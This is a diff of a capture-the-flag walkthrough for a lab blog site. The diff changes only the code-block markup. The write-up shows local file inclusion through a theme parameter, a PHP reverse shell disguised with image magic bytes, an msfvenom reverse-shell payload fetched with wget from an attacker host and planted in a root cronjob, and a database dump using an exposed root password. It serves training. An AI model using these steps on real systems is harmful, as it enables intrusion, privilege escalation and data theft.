@@ -21,15 +21,15 @@ When you first visit the YoBlog homepage, you are greeted with a banner, some ar
 
 When the theme button is clicked, the user is given a few choices in color. If “White” is selected, the source will change from:
 
-{% highlight html %}
+```html
 <body>
-{% endhighlight %}
+```
 
 To:
 
-{% highlight html %}
+```html
 <body style="background-color: rgb(255, 255, 255);">
-{% endhighlight %}
+```
 
 Another interesting tidbit to note is that the URL changes from “http://yo.blog/index.php” to “http://yo.blog/index.php?theme=white.php” The “.php” shows us that to change the theme, a file might be loaded. Let’s try giving it a system file and see what happened! Navigate to the following URL:
 
@@ -88,15 +88,15 @@ The admin page contains user statistics and a suspect upload page. The route to 
  
 Using the LFI from the home page, you can gather that the code to check the image is the following:
 
-{% highlight php %}
+```php
 if(exif_imagetype($_FILES['userfile']['tmp_name']))
-{% endhighlight %}
+```
 
 Php mentions that “exif_imagetype() reads the first bytes of an image and checks its signature.” ([exif-imagetype](http://php.net/manual/en/function.exif-imagetype.php)). To bypass this all that needs to be done is add the magic numbers ([wiki](https://en.wikipedia.org/wiki/List_of_file_signatures)) to the shell file. The simplest way to do this is cat an image and the php shell together:
 
-{% highlight bash %}
+```bash
 cat random_image.png php-reverse-shell.php > reverse_shell.php
-{% endhighlight %}
+```
 
 Once the reverse_shell.php file is upload we get a message that reads:
  
@@ -124,27 +124,27 @@ If you paid attention to the blog posts, you will have noticed that the admin ha
 
 This should give enough clues to figure out that to get root, the cronjob needs to run a malicious script. I chose to use meterpreter:
 
-{% highlight bash %}
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f elf > shell.elf
-{% endhighlight %}
+```
 
 Next, I start a simple http server:
 
-{% highlight bash %}
+```bash
 python -m SimpleHTTPServer 80
-{% endhighlight %}
+```
 
 and make the script executable:
 
-{% highlight bash %}
+```bash
 chmod 777 shell.elf
-{% endhighlight %}
+```
 
 And wget the script from the vulnerable server:
 
-{% highlight bash %}
+```bash
 wget http://10.0.0.100/shell.elf
-{% endhighlight %}
+```
 
 Next step is to start metasploit:
  
@@ -152,9 +152,9 @@ Next step is to start metasploit:
 
 And finally, add the line to run the script into the cron script:
 
-{% highlight bash %}
+```bash
 echo "/tmp/shell.elf" >> cleanDesktop.sh
-{% endhighlight %}
+```
 
 Once the cronjob executes, we get a root meterpreter shell!
 
@@ -164,24 +164,24 @@ Flag Five – Connect to the Database
 ====================================
 Once you have root, the next step would be to dump the database. In the /var/www/html folder there is a file called db_connect.php. Within this file, you can find a password for the database:
 
-{% highlight php %}
+```php
 $servername = "localhost";
 $username = "root";
 $password = "yoDawg123()";
 $db = "blog";
-{% endhighlight %}
+```
 
 Using the username and password, you can run mysqldump to get every table and database:
 
-{% highlight bash %}
+```bash
 mysqldump -u root -pyoDawg123\(\) --all-databases > db.sql
-{% endhighlight %}
+```
 
 and finally, looking through the sql file, it is possible to get the database flag:
 
-{% highlight sql %}
+```sql
 INSERT INTO `flags` VALUES (1,'admin','897df6fa0250adb72a8acb64dcfa0293','Flag in /admin.php'),(2,'hidden','5b08478093ff4ef1672238ecc53908f0','APPLY @ EARLY WARNING');
-{% endhighlight %}
+```
 
 If you find challenges like this fun, come and apply at Early Warning:
 [securityjobs.earlywarning.com](securityjobs.earlywarning.com)
